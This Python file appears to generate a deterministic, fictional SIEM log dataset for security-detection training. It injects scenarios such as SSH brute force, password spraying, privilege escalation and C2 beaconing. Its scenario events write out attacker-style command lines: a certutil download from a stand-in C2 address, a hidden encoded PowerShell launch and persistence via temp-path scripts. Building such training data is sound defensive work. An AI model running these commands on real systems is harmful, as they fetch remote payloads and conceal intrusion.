"""Deterministic generator for the synthetic SIEM dataset ("synthetic-v1").

Everything here is fictional:
  * hostnames end in .corp.example (a reserved, non-routable name),
  * internal IPs are RFC 1918, external IPs are RFC 5737 documentation ranges,
  * people and accounts are invented.

The generator uses a fixed random seed, so every run produces exactly the same
events. That is what lets the tests say "rule CSA-DET-001 must fire 3 times".

Structure:
  1. _baseline()  -> ordinary, benign activity across 7 days (the "noise")
  2. _scenarios() -> 10 injected defensive-detection scenarios (the "signal")
  3. generate_events() merges both, sorts by time and assigns stable ids.
"""

from __future__ import annotations

import base64
import random
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

DATASET = "synthetic-v1"
START = datetime(2026, 11, 16, tzinfo=UTC)  # Monday 00:00 UTC
DAYS = 7
SEED = 1306

WIN_HOSTS = ["ws-fin-01", "ws-fin-02", "ws-hr-01", "ws-eng-03", "ws-eng-04"]
SERVERS = {"srv-dc-01": "10.10.0.10", "srv-file-01": "10.10.0.20", "srv-app-02": "10.10.0.32"}
LINUX = {"lnx-web-01": "10.10.1.11", "lnx-db-01": "10.10.1.12", "lnx-bastion-01": "10.10.1.5"}
USERS = ["a.patel", "j.morgan", "s.chen", "m.okafor", "l.garcia", "r.svensson", "k.yamada", "d.mensah"]
WS_IP = {h: f"10.20.4.{20 + i * 7}" for i, h in enumerate(WIN_HOSTS)}

ATTACKER_IP = "203.0.113.45"   # documentation range, flagged in the synthetic threat-intel list
SPRAY_IP = "203.0.113.80"
C2_IP = "203.0.113.200"
PARTNER_API = "198.51.100.10"  # benign partner service


def fqdn(host: str) -> str:
    return f"{host}.corp.example"


@dataclass
class Event:
    event_time: datetime
    source: str
    host: str
    event_code: str
    category: str
    action: str
    outcome: str
    severity: str
    message: str
    username: str | None = None
    src_ip: str | None = None
    dst_ip: str | None = None
    dst_port: int | None = None
    protocol: str | None = None
    process_name: str | None = None
    command_line: str | None = None
    raw: dict = field(default_factory=dict)
    scenario_tag: str | None = None

    def as_dict(self, event_id: int) -> dict:
        return {
            "id": event_id,
            "event_time": self.event_time,
            "source": self.source,
            "host": fqdn(self.host),
            "username": self.username,
            "src_ip": self.src_ip,
            "dst_ip": self.dst_ip,
            "dst_port": self.dst_port,
            "protocol": self.protocol,
            "event_code": self.event_code,
            "category": self.category,
            "action": self.action,
            "outcome": self.outcome,
            "severity": self.severity,
            "process_name": self.process_name,
            "command_line": self.command_line,
            "message": self.message,
            "raw": self.raw,
            "scenario_tag": self.scenario_tag,
            "dataset": DATASET,
            "is_synthetic": True,
        }


# ---------------------------------------------------------------------------
# Small event builders (keep the scenario code readable)
# ---------------------------------------------------------------------------
def win_logon(t, host, user, src, ok=True, logon_type=3, tag=None, sev=None):
    code = "4624" if ok else "4625"
    return Event(
        t, "windows", host, code, "authentication", "logon",
        "success" if ok else "failure", sev or ("info" if ok else "low"),
        f"An account {'was successfully logged on' if ok else 'failed to log on'}. "
        f"Account: {user} | Logon type: {logon_type} | Source address: {src}",
        username=user, src_ip=src, raw={"LogonType": logon_type, "EventID": int(code)}, scenario_tag=tag,
    )


def ssh_auth(t, host, user, src, ok=True, tag=None, sev=None):
    return Event(
        t, "linux", host, "SSHD_AUTH", "authentication", "logon",
        "success" if ok else "failure", sev or ("info" if ok else "low"),
        f"sshd[{2000 + t.minute * 10 + t.second}]: {'Accepted publickey' if ok else 'Failed password'} "
        f"for {user} from {src} port {40000 + t.second * 7} ssh2",
        username=user, src_ip=src, dst_port=22, protocol="tcp", raw={"program": "sshd"}, scenario_tag=tag,
    )


def vpn_auth(t, user, src, ok=True, tag=None, sev=None):
    return Event(
        t, "authentication", "vpn-gw-01", "VPN_AUTH", "authentication", "logon",
        "success" if ok else "failure", sev or ("info" if ok else "low"),
        f"VPN portal sign-in {'succeeded' if ok else 'failed: invalid credentials'} for {user} from {src}",
        username=user, src_ip=src, dst_port=443, protocol="tcp", raw={"portal": "remote-access"},
        scenario_tag=tag,
    )


def net_conn(t, host, dst, port, proto="tcp", tag=None, sev="info"):
    src = WS_IP.get(host) or SERVERS.get(host) or LINUX.get(host)
    return Event(
        t, "network", "fw-edge-01", "FW_ALLOW", "network", "connection_allowed", "success", sev,
        f"Firewall allowed outbound {proto.upper()} {src} -> {dst}:{port} (origin host {fqdn(host)})",
        src_ip=src, dst_ip=dst, dst_port=port, protocol=proto,
        raw={"direction": "outbound", "origin_host": fqdn(host)}, scenario_tag=tag,
    )


def process(t, host, user, name, cmd, parent, tag=None, sev="info"):
    return Event(
        t, "windows", host, "4688", "process", "process_created", "success", sev,
        f"A new process has been created. New process: {name} | Parent: {parent} | User: {user}",
        username=user, process_name=name, command_line=cmd,
        raw={"ParentProcessName": parent, "EventID": 4688}, scenario_tag=tag,
    )


def encoded(ps: str) -> str:
    """PowerShell -EncodedCommand uses Base64 of UTF-16LE text."""
    return base64.b64encode(ps.encode("utf-16-le")).decode()


# ---------------------------------------------------------------------------
# 1. Baseline (benign) activity
# ---------------------------------------------------------------------------
def _baseline(rng: random.Random) -> list[Event]:
    events: list[Event] = []
    for day in range(DAYS):
        d0 = START + timedelta(days=day)
        weekend = day >= 5

        def bh(minute_lo=7 * 60, minute_hi=19 * 60, d0=d0):
            # Business hours only, so baseline never looks like off-hours access.
            return d0 + timedelta(minutes=rng.randint(minute_lo, minute_hi), seconds=rng.randint(0, 59))

        for _ in range(6 if weekend else 16):  # workstation / server logons
            user = rng.choice(USERS)
            host = rng.choice(WIN_HOSTS + ["srv-file-01"])
            events.append(win_logon(bh(), host, user, WS_IP[rng.choice(WIN_HOSTS)], logon_type=rng.choice([2, 3, 3, 10])))
        for _ in range(2 if weekend else 4):  # admin SSH with keys
            host = rng.choice(list(LINUX))
            events.append(ssh_auth(bh(), host, rng.choice(["admin.ops", "d.mensah"]), "10.20.4.20"))
        for _ in range(1 if weekend else 3):  # VPN users
            events.append(vpn_auth(bh(), rng.choice(USERS), f"198.51.100.{rng.randint(30, 90)}"))
        for _ in range(2):  # a single typo now and then (below every threshold)
            events.append(win_logon(bh(), rng.choice(WIN_HOSTS), rng.choice(USERS), WS_IP[rng.choice(WIN_HOSTS)], ok=False))
        for _ in range(4 if weekend else 9):  # web application log
            status = rng.choice([200, 200, 200, 200, 304, 404])
            path = rng.choice(["/", "/login", "/api/orders", "/api/products", "/static/app.js", "/favicon.ico"])
            events.append(Event(
                bh(0, 24 * 60 - 1), "application", "lnx-web-01", f"HTTP_{status}", "web", "http_request",
                "success" if status < 400 else "failure", "info",
                f'{"198.51.100." + str(rng.randint(2, 250))} "GET {path} HTTP/1.1" {status} {rng.randint(200, 9000)}',
                src_ip=f"198.51.100.{rng.randint(2, 250)}", dst_port=443, protocol="tcp",
                raw={"path": path, "status": status, "app": "storefront"},
            ))
        for _ in range(5 if weekend else 10):  # normal outbound traffic
            host = rng.choice(WIN_HOSTS)
            dst, port = rng.choice([(PARTNER_API, 443), ("192.0.2.53", 53), ("198.51.100.25", 443), ("192.0.2.123", 123)])
            events.append(net_conn(bh(), host, dst, port, "udp" if port in (53, 123) else "tcp"))
        for _ in range(2 if weekend else 5):  # ordinary processes
            host = rng.choice(WIN_HOSTS)
            name, cmd, parent = rng.choice([
                ("EXCEL.EXE", r'"C:\Program Files\Office\EXCEL.EXE" Q4-budget.xlsx', "explorer.exe"),
                ("chrome.exe", r'"C:\Program Files\Browser\chrome.exe"', "explorer.exe"),
                ("powershell.exe", "powershell.exe -NoProfile -Command Get-Date", "explorer.exe"),
                ("notepad.exe", r"notepad.exe C:\Users\Public\readme.txt", "explorer.exe"),
            ])
            events.append(process(bh(), host, rng.choice(USERS), name, cmd, parent))
        events.append(Event(  # nightly backup job (service account, expected off-hours)
            d0 + timedelta(hours=1, minutes=30), "windows", "srv-file-01", "4624", "authentication", "logon",
            "success", "info", "An account was successfully logged on. Account: svc_backup | Logon type: 5 (service)",
            username="svc_backup", raw={"LogonType": 5, "EventID": 4624},
        ))

    # Benign look-alikes ("near misses") that rules must NOT flag
    d = START + timedelta(days=1, hours=9)
    for i in range(3):  # 3 typos then success: below brute-force and success-after-failure thresholds
        events.append(win_logon(d + timedelta(seconds=20 * i), "ws-eng-03", "s.chen", WS_IP["ws-eng-03"], ok=False))
    events.append(win_logon(d + timedelta(minutes=1), "ws-eng-03", "s.chen", WS_IP["ws-eng-03"]))
    events.append(Event(
        START + timedelta(days=2, hours=11), "windows", "srv-app-02", "4698", "persistence", "scheduled_task_created",
        "success", "info", r"A scheduled task was created. Task: \ExampleCorp\InventoryScan | Action: "
        r'"C:\Program Files\ExampleCorp\inventory.exe" /scan',
        username="admin.ops", command_line=r'"C:\Program Files\ExampleCorp\inventory.exe" /scan',
        raw={"TaskName": r"\ExampleCorp\InventoryScan", "EventID": 4698},
    ))
    events.append(Event(
        START + timedelta(days=3, hours=14), "windows", "srv-file-01", "7045", "service", "service_installed",
        "success", "info", r"A service was installed. Service: ExampleCorp Backup Agent | Image path: "
        r'"C:\Program Files\ExampleCorp\backup-agent.exe"',
        username="admin.ops", command_line=r'"C:\Program Files\ExampleCorp\backup-agent.exe"',
        raw={"ServiceName": "ExampleCorp Backup Agent", "EventID": 7045},
    ))
    return events


# ---------------------------------------------------------------------------
# 2. Injected scenarios (the defensive detections learners investigate)
# ---------------------------------------------------------------------------
def _scenarios() -> list[Event]:
    ev: list[Event] = []
    T = START

    # S1 — Brute force against the SSH bastion (CSA-DET-001)
    t = T + timedelta(days=1, hours=2, minutes=14)
    for i in range(12):
        ev.append(ssh_auth(t + timedelta(seconds=18 * i), "lnx-bastion-01", "root", ATTACKER_IP, ok=False,
                           tag="S1-bruteforce-ssh", sev="medium"))

    # S1b — An employee repeatedly mistyping (also CSA-DET-001; a likely false positive to triage)
    t = T + timedelta(days=3, hours=13, minutes=2)
    for i in range(8):
        ev.append(win_logon(t + timedelta(seconds=40 * i), "ws-fin-01", "j.morgan", WS_IP["ws-fin-01"], ok=False,
                            logon_type=2, tag="S1b-user-lockout", sev="low"))

    # S2 — Password spraying the VPN portal: one source, many accounts (CSA-DET-002)
    t = T + timedelta(days=2, hours=1, minutes=40)
    for i, user in enumerate(["a.patel", "j.morgan", "l.garcia", "r.svensson", "k.yamada", "d.mensah"]):
        ev.append(vpn_auth(t + timedelta(seconds=75 * i), user, SPRAY_IP, ok=False, tag="S2-password-spray",
                           sev="medium"))

    # S3 — Failures followed by success for m.okafor (CSA-DET-003, also trips CSA-DET-001)
    t = T + timedelta(days=4, hours=22, minutes=5)
    for i in range(6):
        ev.append(vpn_auth(t + timedelta(seconds=30 * i), "m.okafor", ATTACKER_IP, ok=False,
                           tag="S3-success-after-failures", sev="medium"))
    ev.append(vpn_auth(t + timedelta(minutes=4), "m.okafor", ATTACKER_IP, ok=True,
                       tag="S3-success-after-failures", sev="high"))

    # S4 — Privileged group membership changes (CSA-DET-004): one suspicious, one approved
    ev.append(Event(
        T + timedelta(days=4, hours=22, minutes=31), "windows", "srv-dc-01", "4728", "account_management",
        "group_member_added", "success", "high",
        "A member was added to a security-enabled global group. Member: m.okafor | Group: Domain Admins | "
        "Changed by: m.okafor",
        username="m.okafor", raw={"TargetGroup": "Domain Admins", "SubjectUser": "m.okafor", "EventID": 4728},
        scenario_tag="S4-privilege-escalation",
    ))
    ev.append(Event(
        T + timedelta(days=2, hours=10, minutes=15), "windows", "srv-dc-01", "4732", "account_management",
        "group_member_added", "success", "medium",
        "A member was added to a security-enabled local group. Member: r.svensson | Group: Backup Operators | "
        "Changed by: admin.ops | Change ticket: CHG-1042 (approved)",
        username="r.svensson",
        raw={"TargetGroup": "Backup Operators", "SubjectUser": "admin.ops", "ChangeTicket": "CHG-1042", "EventID": 4732},
        scenario_tag="S4b-approved-change",
    ))

    # S10 — Office document spawns hidden, encoded PowerShell; LOLBin download (CSA-DET-010)
    ps = encoded("Write-Output 'Cybersec Academy simulated payload - harmless'")
    ev.append(process(T + timedelta(days=4, hours=22, minutes=44), "ws-fin-02", "m.okafor", "powershell.exe",
                      f"powershell.exe -NoP -W Hidden -enc {ps}", "WINWORD.EXE", tag="S10-encoded-powershell",
                      sev="high"))
    ev.append(process(T + timedelta(days=3, hours=15, minutes=9), "ws-hr-01", "l.garcia", "certutil.exe",
                      f"certutil.exe -urlcache -split -f http://{C2_IP}/update.txt C:\\Users\\Public\\update.txt",
                      "cmd.exe", tag="S10b-lolbin-download", sev="high"))

    # S5 — Beaconing to a non-standard port on a threat-intel address (CSA-DET-005)
    t = T + timedelta(days=4, hours=22, minutes=48)
    for i in range(5):
        ev.append(net_conn(t + timedelta(seconds=60 * i), "ws-fin-02", C2_IP, 4444, tag="S5-c2-beacon", sev="high"))

    # S7 — Scheduled task / cron persistence from user-writable paths (CSA-DET-007)
    ev.append(Event(
        T + timedelta(days=4, hours=23, minutes=2), "windows", "ws-fin-02", "4698", "persistence",
        "scheduled_task_created", "success", "high",
        r"A scheduled task was created. Task: \OneDriveSyncHelper | Action: powershell.exe -W Hidden -File "
        r"C:\Users\m.okafor\AppData\Local\Temp\sync.ps1",
        username="m.okafor", command_line=r"powershell.exe -W Hidden -File C:\Users\m.okafor\AppData\Local\Temp\sync.ps1",
        raw={"TaskName": r"\OneDriveSyncHelper", "EventID": 4698}, scenario_tag="S7-scheduled-task",
    ))
    ev.append(Event(
        T + timedelta(days=5, hours=4, minutes=10), "linux", "lnx-web-01", "CRON_EDIT", "persistence",
        "crontab_modified", "success", "high",
        "crontab[3121]: (www-data) REPLACE (www-data) new entry: */10 * * * * /tmp/.cache/update.sh",
        username="www-data", command_line="*/10 * * * * /tmp/.cache/update.sh",
        raw={"program": "crontab", "entry": "*/10 * * * * /tmp/.cache/update.sh"}, scenario_tag="S7b-cron",
    ))

    # S6 — Service installed from a public, user-writable folder (CSA-DET-006)
    ev.append(Event(
        T + timedelta(days=5, hours=3, minutes=12), "windows", "srv-file-01", "7045", "service", "service_installed",
        "success", "critical",
        r"A service was installed. Service: WinUpdSvc32 | Image path: C:\Users\Public\svchost.exe",
        username="m.okafor", command_line=r"C:\Users\Public\svchost.exe",
        raw={"ServiceName": "WinUpdSvc32", "EventID": 7045}, scenario_tag="S6-suspicious-service",
    ))

    # S8 — Defence-impairing configuration changes (CSA-DET-008)
    ev.append(Event(
        T + timedelta(days=5, hours=3, minutes=20), "windows", "srv-dc-01", "4719", "configuration",
        "audit_policy_changed", "success", "high",
        "System audit policy was changed. Category: Logon/Logoff | Subcategory: Logon | Changes: Success removed, "
        "Failure removed",
        username="m.okafor", raw={"EventID": 4719, "Subcategory": "Logon"}, scenario_tag="S8-audit-policy",
    ))
    ev.append(Event(
        T + timedelta(days=5, hours=3, minutes=25), "windows", "srv-dc-01", "1102", "configuration",
        "audit_log_cleared", "success", "critical", "The audit log was cleared. Subject: m.okafor",
        username="m.okafor", raw={"EventID": 1102}, scenario_tag="S8-log-cleared",
    ))
    ev.append(Event(
        T + timedelta(days=1, hours=9, minutes=30), "linux", "lnx-bastion-01", "SSHD_CONFIG_CHANGE", "configuration",
        "config_modified", "success", "medium",
        "auditd: /etc/ssh/sshd_config modified by admin.ops (PasswordAuthentication no) | Change ticket: CHG-1038",
        username="admin.ops", raw={"file": "/etc/ssh/sshd_config", "ChangeTicket": "CHG-1038"},
        scenario_tag="S8b-approved-hardening",
    ))

    # S9 — Interactive access in the middle of the night (CSA-DET-009)
    ev.append(win_logon(T + timedelta(days=5, hours=2, minutes=47), "srv-dc-01", "m.okafor", WS_IP["ws-fin-02"],
                        logon_type=10, tag="S9-offhours-rdp", sev="medium"))
    ev.append(vpn_auth(T + timedelta(days=6, hours=3, minutes=30), "k.yamada", "192.0.2.14",
                       tag="S9b-travelling-user", sev="low"))
    return ev


def generate_events() -> list[dict]:
    """Return the full dataset as plain dicts, sorted by time, with ids 1..N."""
    rng = random.Random(SEED)  # noqa: S311 — deterministic synthetic data, not cryptography
    events = _baseline(rng) + _scenarios()
    events.sort(key=lambda e: (e.event_time, e.host, e.event_code, e.message))
    return [e.as_dict(i) for i, e in enumerate(events, start=1)]
